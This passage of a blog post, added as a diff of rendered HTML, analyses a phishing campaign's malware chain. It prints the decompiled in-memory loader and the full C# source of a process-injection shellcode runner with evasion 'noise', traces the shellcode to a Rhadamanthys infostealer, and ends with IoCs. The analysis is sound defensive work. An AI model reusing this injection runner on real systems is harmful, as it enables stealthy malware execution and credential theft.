+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#E6EDF3">    ReferencedAssemblies </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#8B949E">      // System.dll</span></span>
+<span class="line"><span style="color:#E6EDF3">      AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedSystemDllString</span><span style="color:#E6EDF3">(), Constants.aesKey, Constants.aesIv),</span></span>
+<span class="line"><span style="color:#8B949E">      // System.Core.dll</span></span>
+<span class="line"><span style="color:#E6EDF3">      AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedSystemCoreDllString</span><span style="color:#E6EDF3">(), Constants.aesKey, Constants.aesIv)</span></span>
+<span class="line"><span style="color:#E6EDF3">    },</span></span>
+<span class="line"><span style="color:#E6EDF3">    GenerateInMemory </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> true</span></span>
+<span class="line"><span style="color:#E6EDF3">  }, AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(</span></span>
+<span class="line"><span style="color:#E6EDF3">    \u003CModule\u003E.</span><span style="color:#D2A8FF">ShellcodeRunnerSourceCode</span><span style="color:#E6EDF3">(), </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesKey, </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesIv</span></span>
+<span class="line"><span style="color:#E6EDF3">    )</span></span>
+<span class="line"><span style="color:#8B949E">    // VerbGuns.VerbTrio</span></span>
+<span class="line"><span style="color:#E6EDF3">    ).CompiledAssembly.</span><span style="color:#D2A8FF">GetType</span><span style="color:#E6EDF3">(AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedClassName</span><span style="color:#E6EDF3">(), </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesKey, </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesIv)</span></span>
+<span class="line"><span style="color:#E6EDF3">  ).</span><span style="color:#D2A8FF">GetMethod</span><span style="color:#E6EDF3">(AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(</span></span>
+<span class="line"><span style="color:#8B949E">    // InforPage</span></span>
+<span class="line"><span style="color:#E6EDF3">    \u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedMethodName</span><span style="color:#E6EDF3">(), </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesKey, </span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesIv)</span></span>
+<span class="line"><span style="color:#E6EDF3">  ).</span><span style="color:#D2A8FF">Invoke</span><span style="color:#E6EDF3">((</span><span style="color:#FF7B72">object</span><span style="color:#E6EDF3">) </span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#FF7B72">    new</span><span style="color:#FF7B72"> object</span><span style="color:#E6EDF3">[</span><span style="color:#79C0FF">2</span><span style="color:#E6EDF3">] {</span></span>
+<span class="line"><span style="color:#E6EDF3">    (</span><span style="color:#FF7B72">object</span><span style="color:#E6EDF3">) executablePath,</span></span>
+<span class="line"><span style="color:#E6EDF3">    (</span><span style="color:#FF7B72">object</span><span style="color:#E6EDF3">) shellcode</span></span>
+<span class="line"><span style="color:#E6EDF3">  });</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<h2 id="shellcode-runner-source-code">Shellcode runner source code</h2>
+<p>The source code of the shellcode runner is a classic one, with the runner accepting an executable path to run and the shellcode itself. It will create a process, allocates memory and copies the shellcode, then finally creates a thread to run the shellcode. The runner also has a method to deliberately create noise before the execution of the shellcode.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cs"><code><span class="line"><span style="color:#FF7B72">public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> void</span><span style="color:#D2A8FF"> InforPage</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">string</span><span style="color:#FFA657"> path</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">[] </span><span style="color:#FFA657">shellcode</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#D2A8FF">    PreExecutionNoise</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">    STARTUPINFO</span><span style="color:#FFA657"> si</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FFA657"> STARTUPINFO</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#E6EDF3">    si.cb </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">uint</span><span style="color:#E6EDF3">)Marshal.</span><span style="color:#D2A8FF">SizeOf</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">typeof</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">STARTUPINFO</span><span style="color:#E6EDF3">));</span></span>
+<span class="line"><span style="color:#FFA657">    PROCESS_INFORMATION</span><span style="color:#FFA657"> pi</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">!</span><span style="color:#D2A8FF">CreateProcess</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">, path, IntPtr.Zero, IntPtr.Zero, </span><span style="color:#79C0FF">false</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">, IntPtr.Zero, </span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">ref</span><span style="color:#E6EDF3"> si, </span><span style="color:#FF7B72">out</span><span style="color:#E6EDF3"> pi) </span><span style="color:#FF7B72">||</span><span style="color:#E6EDF3"> pi.hProcess </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> IntPtr.Zero)</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#E6EDF3">        Thread.</span><span style="color:#D2A8FF">Sleep</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">30</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">    IntPtr</span><span style="color:#FFA657"> allocatedMemory</span><span style="color:#FF7B72"> =</span><span style="color:#D2A8FF"> VirtualAllocEx</span><span style="color:#E6EDF3">(pi.hProcess, IntPtr.Zero, (</span><span style="color:#FF7B72">uint</span><span style="color:#E6EDF3">)shellcode.Length, </span><span style="color:#79C0FF">0x3000</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x40</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> (allocatedMemory </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> IntPtr.Zero)</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#D2A8FF">        Cleanup</span><span style="color:#E6EDF3">(pi);</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">    IntPtr</span><span style="color:#FFA657"> bytesWritten</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">!</span><span style="color:#D2A8FF">WriteProcessMemory</span><span style="color:#E6EDF3">(pi.hProcess, allocatedMemory, shellcode, (</span><span style="color:#FF7B72">uint</span><span style="color:#E6EDF3">)shellcode.Length, </span><span style="color:#FF7B72">out</span><span style="color:#E6EDF3"> bytesWritten) </span><span style="color:#FF7B72">||</span><span style="color:#E6EDF3"> bytesWritten </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> IntPtr.Zero)</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#D2A8FF">        Cleanup</span><span style="color:#E6EDF3">(pi);</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">    IntPtr</span><span style="color:#FFA657"> remoteThreadId</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FFA657">    IntPtr</span><span style="color:#FFA657"> hThread</span><span style="color:#FF7B72"> =</span><span style="color:#D2A8FF"> CreateRemoteThread</span><span style="color:#E6EDF3">(pi.hProcess, IntPtr.Zero, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, allocatedMemory, IntPtr.Zero, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">out</span><span style="color:#E6EDF3"> remoteThreadId);</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> (hThread </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> IntPtr.Zero)</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#D2A8FF">        Cleanup</span><span style="color:#E6EDF3">(pi);</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D2A8FF">    WaitForSingleObject</span><span style="color:#E6EDF3">(hThread, </span><span style="color:#79C0FF">0xFFFFFFFF</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#D2A8FF">    TerminateProcess</span><span style="color:#E6EDF3">(pi.hProcess, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D2A8FF">    CloseHandle</span><span style="color:#E6EDF3">(hThread);</span></span>
+<span class="line"><span style="color:#D2A8FF">    Cleanup</span><span style="color:#E6EDF3">(pi);</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">private</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> void</span><span style="color:#D2A8FF"> PreExecutionNoise</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FFA657">    Random</span><span style="color:#FFA657"> rand</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FFA657"> Random</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">    int</span><span style="color:#FFA657"> dummyState</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">5</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">15</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">int</span><span style="color:#FFA657"> i</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; i </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3"> dummyState; i</span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#FF7B72">        switch</span><span style="color:#E6EDF3"> (rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">4</span><span style="color:#E6EDF3">))</span></span>
+<span class="line"><span style="color:#E6EDF3">        {</span></span>
+<span class="line"><span style="color:#FF7B72">            case</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">                Thread.</span><span style="color:#D2A8FF">Sleep</span><span style="color:#E6EDF3">(rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">5</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">15</span><span style="color:#E6EDF3">));</span></span>
+<span class="line"><span style="color:#FF7B72">                break</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">            case</span><span style="color:#79C0FF"> 1</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#D2A8FF">                NoiseMath</span><span style="color:#E6EDF3">(rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">999</span><span style="color:#E6EDF3">));</span></span>
+<span class="line"><span style="color:#FF7B72">                break</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">            case</span><span style="color:#79C0FF"> 2</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">                string</span><span style="color:#FFA657"> temp</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'*'</span><span style="color:#E6EDF3">, rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">5</span><span style="color:#E6EDF3">));</span></span>
+<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3"> (temp.</span><span style="color:#D2A8FF">Contains</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"#"</span><span style="color:#E6EDF3">)) </span><span style="color:#FF7B72">break</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">                break</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">            case</span><span style="color:#79C0FF"> 3</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">                for</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">int</span><span style="color:#FFA657"> j</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; j </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3"> rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">3</span><span style="color:#E6EDF3">); j</span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">                {</span></span>
+<span class="line"><span style="color:#FFA657">                    DateTime</span><span style="color:#FFA657"> dt</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> DateTime.Now;</span></span>
+<span class="line"><span style="color:#E6EDF3">                    dt.</span><span style="color:#D2A8FF">AddMilliseconds</span><span style="color:#E6EDF3">(rand.</span><span style="color:#D2A8FF">Next</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">));</span></span>
+<span class="line"><span style="color:#E6EDF3">                }</span></span>
+<span class="line"><span style="color:#FF7B72">                break</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">        }</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<h1 id="stage-3-shellcode-analysis">Stage 3: Shellcode analysis</h1>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>I have to preface this section by saying that my reverse engineering skills are very subpar, so this section will be more exploratory and explains how I tackled analysing the shellcode.</p>
+</blockquote>
+<p>For some reason, this shellcode could not be analysed using shellcode-specific dynamic analysis tools such as <a href="https://github.com/mandiant/speakeasy">Speakeasy</a> by Mandiant. Therefore, I decided to go the old-fashioned way and used x32dbg and BlobRunner inside an isolated FLARE VM instance to run the shellcode.</p>
+<p>The shellcode goes through stages of dynamically resolves certain system calls that is needed for the shellcode to run, which I honestly have no idea how it actually works. After skipping the dynamic resolution, we arrived at an address that calls a Windows API system call.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_3.png" alt=""></p>
+<p>This specific instruction will call a syscall stored in <code>edi</code>, which turns out to be <code>VirtualAlloc</code>. To see the arguments given to <code>VirtualAlloc</code>, we can see the stack values just before the <code>call</code> instruction.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_4.png" alt=""></p>
+<p>The first argument is set to 0, where the system will determine where to allocate the memory. Next up is the size of the memory region, which is set to <code>0x929C0</code>. The rest of the arguments are irrelevant to our analysis but the full details of parameters needed for <code>VirtualAlloc</code> can be found <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">here</a>.</p>
+<p>After the call, the address of the memory block will be returned to the <code>eax</code> register. Now we let the program run and dump the memory region returned by <code>eax</code> to see anything suspicious.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>❯ binwalk blobrunner_019B0000.bin</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>DECIMAL       HEXADECIMAL     DESCRIPTION</span></span>
+<span class="line"><span>--------------------------------------------------------------------------------</span></span>
+<span class="line"><span>4744          0x1288          Microsoft executable, portable (PE)</span></span>
+<span class="line"><span>501088        0x7A560         SHA256 hash constants, little endian</span></span></code></pre>
+<p>The shellcode will write a PE executable to the memory region. We can check the hash of the executable on VirusTotal to see if there is any hits.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_5.png" alt=""></p>
+<p>The results are a bit all over the place with mentions of Strab, Zusy and Rhadamanthys but based on this <a href="https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/">blog</a>, a Lumma or Rhadamanthys executable will pop-up a dialog that will display a unique message. When running the sample inside an isolated VM, the unique message appears.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_6.png" alt=""></p>
+<p>The difference between Lumma and Rhadamanthys is that Lumma will use the <code>NtRaiseHardError</code> system call whereas Rhadamanthys will use the <code>MessageBoxW</code> system call. By analysing the API calls of the executable using API monitor, we can see the dialog box is displayed using the <code>MessageBoxW</code>, hence revealing the executable as being a Rhadamanthys infostealer.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_7.png" alt=""></p>
+<h1 id="closing-statements">Closing Statements</h1>
+<p>This was a fun experience and definitely a brutal one for me, especially when trying to understand how the shellcode operates. But I learned a lot about how an actual phishing campaign works and what kinds of techniques are used to achieve the threat actor’s goals.</p>
+<p>Since my analysis in October, the domain and the IP address has been inactive.</p>
+<h1 id="indicators-of-compromise-ioc">Indicators of Compromise (IoC)</h1>
+<h2 id="files">Files</h2>
+<table>
+    <thead>
+        <tr>
+            <th>SHA256 Hash</th>
+            <th>Information</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>0aa27437d32e15689e37d2daae90a477207b0c99a86cf7789abe706da79b0eb8</td>
+            <td>platinum.odd (MSHTA launcher)</td>
+        </tr>
+        <tr>
+            <td>1ed14377681bc654e5f2ff20f5dbfd7888751ee84412315fcc3d2fc4b17b1b13</td>
+            <td>PowerShell dropper</td>
+        </tr>
+        <tr>
+            <td>628c9444c6c7266352d71e721ca8ac1c953afe2f4ffc2f7be0ed061da4610571</td>
+            <td>Shellcode loader</td>
+        </tr>
+        <tr>
+            <td>615485de6b58f27ab6b2a716d8b22d9119fdacb28a232304215fd57dbe2d7574</td>
+            <td>Rhadamanthys stealer</td>
+        </tr>
+    </tbody>
+</table>
+<h2 id="ips">IPs</h2>
+<p><code>206[.]245[.]132[.]15</code></p>
+<h2 id="urls">URLs</h2>
+<p><code>hxxp[://]206[.]0xF5[.]132[.]15/platinum[.]odd</code></p>
+<p><code>hxxp[://]jonathanmillersagriculture[.]site</code></p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li><a href="#constants">Constants</a></li><li><a href="#shellcode-obfuscation-through-steganography">Shellcode obfuscation through steganography</a></li><li><a href="#dynamic-compiling-of-the-shellcode-runner">Dynamic compiling of the shellcode runner</a></li><li><a href="#shellcode-runner-source-code">Shellcode runner source code</a></li><li><a href="#files">Files</a></li><li><a href="#ips">IPs</a></li><li><a href="#urls">URLs</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
